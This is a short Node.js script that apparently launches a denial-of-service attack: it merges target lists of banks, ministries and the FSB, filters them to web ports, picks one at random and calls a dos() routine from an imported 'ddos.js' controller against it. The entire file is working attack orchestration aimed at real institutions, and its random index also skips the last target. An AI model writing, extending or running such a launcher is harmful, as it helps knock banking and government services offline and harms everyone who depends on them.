const { dos } = require("./controllers/ddos.js");

const banks = require("./targets/banks.json");
const ministries = require("./targets/ministries.json");
const fsb = require("./targets/fsb.json");

const jointTargets = [...banks, ...ministries, ...fsb];

const allowedPorts = [80, 8080, 443];
const filteredTargets = jointTargets.filter(
  ({ ip_str, port }) => allowedPorts.includes(port) && ip_str !== undefined
);

const index = Math.floor(Math.random() * (filteredTargets.length - 1));

const { ip_str, port } = filteredTargets[index];

const protocol = port === 443 ? "https://" : "http://";

dos(`${protocol}${ip_str}`, 200, 500);
